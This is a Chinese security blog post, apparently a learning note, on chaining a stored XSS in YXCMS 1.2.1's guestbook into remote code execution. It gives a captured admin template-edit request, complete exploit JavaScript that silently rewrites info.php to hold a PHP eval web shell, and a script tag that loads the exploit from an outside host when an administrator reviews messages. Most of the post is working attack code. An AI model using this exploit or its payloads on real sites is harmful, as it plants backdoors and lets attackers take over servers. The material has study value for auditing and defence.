# [XSS利用姿势]XSS利用模板编辑getshell

time：2021-5-17

---

> 该知识点来源于P牛的yxcms审计文章，因第一次见这种姿势，随记录学习。

测试平台为本地搭建的YXCMS1.2.1

XSS漏洞利用点为首页的留言本

### 0x01 后台的模板编辑功能

YXcms后台可以直接编辑前台模板，这次测试编辑info.php

![image-20210517170739300](C:\Users\King\AppData\Roaming\Typora\typora-user-images\image-20210517170739300.png)

点击保存同时bp抓包，从请求包中可以得到很多信息：

```
POST /YXcms1.2.1/index.php?r=admin/set/tpedit&Mname=default&fname=info.php HTTP/1.1
Host: localhost
Content-Length: 168
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: iframe
Referer: http://localhost/YXcms1.2.1/index.php?r=admin/set/tpedit&Mname=default&fname=info.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=joe5plgefnco7rg99r4ta0vhg6
Connection: close

code=%3C%3Fphp+return+array+%28+%27name%27+%3D%3E+%27%E6%9C%80%E6%96%B0%E9%BB%98%E8%AE%A4%E6%A8%A1%E6%9D%BF2013-2-1%27%2C+%27author%27+%3D%3E+%27yx%27%2C%29%3B+%3F%3E++
```

发现点击保存后实际请求为POST请求，且url为：

```
/index.php?r=admin/set/tpedit&Mname=default&fname=info.php
```

请求体中code参数值就是编辑文本框中的内容：

```
code=%3C%3Fphp+return+array+%28+%27name%27+%3D%3E+%27%E6%9C%80%E6%96%B0%E9%BB%98%E8%AE%A4%E6%A8%A1%E6%9D%BF2013-2-1%27%2C+%27author%27+%3D%3E+%27yx%27%2C%29%3B+%3F%3E++
```

### 0x02 构造EXP

之后就可以利用XSS来请求一个**我们精心构造的，且会对上述url进行携带post数据的请求的js脚本**。

P牛的EXP：

```js
$(document).ready(function(){
var code = "<?php eval($_POST[pass]); ?><?php return array ( 'name' => '最新默认模板2013-2-1', 'author' => 'yx',); ?> ";
$.post("/tmp/index.php?r=admin/set/tpedit&Mname=default&fname=info.php", {"code": code},function(data){});
});
```

### 0x03 利用

将其放在服务器上，利用XSS payload进行留言：

```js
<script src=http://xxxx/exp.js></script>
```

最终的效果就是：管理员审核留言时触发XSS自动执行上述js脚本，即自动进行了模板编辑保存行为，写入了一句话木马。

